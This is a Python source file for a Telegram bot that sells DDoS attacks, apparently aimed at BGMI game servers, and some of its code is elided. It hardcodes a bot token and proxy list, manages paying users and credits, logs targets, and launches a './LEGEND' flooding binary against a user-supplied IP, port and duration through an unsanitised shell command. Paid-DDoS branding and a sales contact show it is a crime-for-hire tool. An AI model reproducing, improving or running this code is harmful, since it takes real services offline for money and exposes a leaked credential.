...
# @MARSHALOP GRP#bgmiddoserpython
...
# @MARSHALOP GRPTg #from keep_alive import keep_alive
# @MARSHALOP GRP #keep_alive()
# @MARSHALOP GRP# insert your Telegram bot token here

    
bot = telebot.TeleBot('7718261626:AAG2AIDmhl6zWf0uZ6jexHAxTj3PZvmvcaM')

# @MARSHALOP GRP # Admin user IDs
admin_id = ["6312238286"]

# @MARSHALOP GRP # File to store allowed user IDs
USER_FILE = "users.txt"

# @MARSHALOP GRP # File to store command logs
LOG_FILE = "log.txt"


# @MARSHALOP GRP # List of proxy addresses
PROXIES = [
...
"https://162.223.94.164:80",#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
...
"https://50.168.163.182:80",#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
...
"https://3.12.144.146:3128",#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
...
"https://50.174.7.157:80",#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
...
"https://12.186.205.122:80",#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
...
"https://50.239.72.18:80",#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
...
"https://134.73.65.97:6649"
    # @MARSHALOP GRP # Add more proxy addresses as needed
]
...
# @MARSHALOP GRP# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # @MARSHALOP GRP # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
...
# @MARSHALOP GRP # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # @MARSHALOP GRP # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# @MARSHALOP GRP # Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = ". No data found ."#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
...
# @MARSHALOP GRP # Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
...
def add_user(message):
    ...
    if user_id in admin_id:
        command = message.text.split()#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
#script by @MARSHALOP 🚩
...
# @MARSHALOP GRP # Function to handle the reply when free users run the /bgmi command
...
# @MARSHALOP GRP # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                ...
                bot.reply_to(message, response)
                return
            # @MARSHALOP GRP # Update the last time the user ran the command
        ...
        if len(command) == 4:  # @MARSHALOP GRP # Updated to accept target, time, and port
            ...
            if time > 180:
                ...
                record_command_logs(user_id, '/paid', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # @MARSHALOP GRP # Call start_attack_reply function
                full_command = f"./LEGEND {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n_SHADOW_PAID_DDOS"
        else:
            response = "𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝘼𝙏𝙏𝘼𝘾𝙆\n𝗟𝗜𝗞𝗘 :- /𝗼𝗽 𝟮.𝟯𝟰.𝟱𝟲.𝟱𝟲 𝟮𝟯𝟰𝟱𝟲 18𝟬\n𝗟𝗜𝗞𝗘 :- /𝗼𝗽 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲\n\n_SHADOW_PAID_DDOS"  # @MARSHALOP GRP # Updated command syntax
    else:
        response = "🚫 𝗠𝗲𝘁𝗵𝗼𝗱  𝗹𝗶𝗸𝗲 𝗲𝗮𝘀𝘆 𝗯𝘂𝘁 𝘆𝗼𝘂 𝗮𝗿𝗲 🚫𝗻𝗼𝘁 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝘁𝗵𝗶𝘀 𝘄𝗼𝗿𝗱 𝗜 𝗰𝗮𝗻'𝘁 𝗵𝗲𝗹𝗽 𝘁𝗼 𝘂𝘀𝗲\n𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖𝙛𝙩𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙬𝙤𝙧𝙙 /paid \n𝙘𝙤𝙣𝙩𝙖𝙘𝙩 :- @SHADOW_OFFICIAL11\n\n_SHADOW_PAID_DDOS"

    bot.reply_to(message, response)



# @MARSHALOP GRP # Add /mylogs command to display logs recorded for bgmi and website commands

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🙏SHADOW_PAID_DDOS🙏'''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['owner'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''@SHADOW_OFFICIAL11'''
    bot.reply_to(message, response)
